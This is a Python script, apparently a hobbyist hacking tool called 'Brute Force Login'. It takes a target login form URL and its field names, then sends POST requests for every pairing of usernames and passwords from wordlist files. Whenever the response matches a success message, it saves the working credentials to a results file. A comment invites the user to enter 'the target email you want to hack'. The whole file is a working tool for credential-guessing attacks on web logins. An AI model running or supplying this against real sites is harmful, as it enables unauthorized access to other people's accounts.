# Brute Force Login
# By S4n1x D4rk3r

from os import system as ss
from sys import exit
try:
    import requests
except Exception as es:
    print(es)
    ss("pip install requests")
    import requests

LIMIT_TRYING_ACCESSING_URL = 5

def openRessources(filePath):
    array_ = open(filePath).readlines()
    array_ = [item.replace("\n", "") for item in array_]
    return array_


def manualMode():
    print("[+] Manual mode selected ")
    print("[+] After inspecting the LOGIN <form />, please fill here :")

    # Field's Form -------
    # The link of the website
    url = input("\n[+] Enter the target URL (it's the 'action' attribute on the Login form):")
    # The userfield in the form of the login
    userField = input("\n[+] Enter the User Field  (it's the 'name' attribute on the Login form for the username/email):")
    # The passwordfield in the form
    passwordField = input("\n[+] Enter the Password field  (it's the 'name' attribute on the Login form for the password):")


    # Ressources -------
    # list of potential incorrect message in the page if it doesn't succeed
    incorrectMessage = openRessources('./ressources/incorrectMessage.txt')
    # list of potential success message in the page if it succeed
    successMessage = openRessources('./ressources/successMessage.txt')
    # Getting list of potentials password
    passwords = openRessources('./ressources/passwords.txt')
    # Getting list of user to test with
    users = openRessources('./ressources/users.txt')


    print ("[+] Connecting to: "+url+"......\n")
    # Put the target email you want to hack
    #user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
    failed_aftertry = 0
    for user in users:
        for password in passwords:
            dados = {userField: user.replace('\n', ''),
                    passwordField: password.replace('\n', '')}
            print ("[+]", dados)
            # Doing the post form
            request = requests.post(url, data=dados)
            #print data.text
            if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
                if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
                    print ("[+] Connexion failed : Trying again ....")
                    break
                else:
                    failed_aftertry = failed_aftertry+1
                    print ("[+] Connexion failed : 404 Not Found (Verify your url)")
            else:
                # if you want to see the text result decomment this
                #print data.text
                if incorrectMessage[0] in request.text or incorrectMessage[1] in request.text:
                    print ("[+] Failed to connect with:\n user: "+user+" and password: "+password)
                else:
                    if successMessage[0] in request.text or successMessage[1] in request.text:
                        result = "\n--------------------------------------------------------------"
                        result += "\nYOUPIII!! \nTheese Credentials succeed:\n> user: "+user+" and password: "+password
                        result += "--------------------------------------------------------------"
                        with open("./results.txt", "w+") as frr:
                            frr.write(result)
                        print("[+] A Match succeed 'user: "+user+" and password: "+password+"' and have been saved at ./results.txt")
                        break
                    else:
                        print ("Trying theese parameters: user: "+user+" and password: "+password)



def extractFieldForm(html_contain):
    print("[+] Starting extraction...")


def automaticMode():
    print("[+ This option is not yet ready....]")
    checkpoint_1()
    # # Field's Form -------
    # # The link of the website
    # url = input("\n[+] Enter the URL of the webSite and let me do the rest :")
    # r = requests.get(url)
    # extractFieldForm(r.content)


def checkpoint_1():
    print("[+] Select a mode for detecting fields:")
    print("[+] 1-) Automatic mode (Will get all necessary field and proceed)")
    print("[+] 2-) Manual mode (you will provide necessary informations before continue)")
    print("[+] -")
    print("[+] 0-) Stop the program")
    mode = int(input("[+] Choice: "))
    if mode == 1:
        automaticMode()
    elif mode == 2:
        manualMode()
    elif mode == 0:
        exit()
    else:
        checkpoint_1()

def main():
    print ("\n[+] # -------------------------------------------")
    print ("[+] # | __ )  |  ___| | |    ")
    print ("[+] # |  _ \  | |_    | |    ")
    print ("[+] # | |_) | |  _|   | |___ ")
    print ("[+] # |____/  |_|     |_____| v0.0.2")
    print ("[+] # => Brute Force Login <=                     #")
    print ("[+] # By S@n1x d4rk3r                             #")
    print ("[+] # #############################################")

    checkpoint_1()

if __name__ == '__main__':
    main()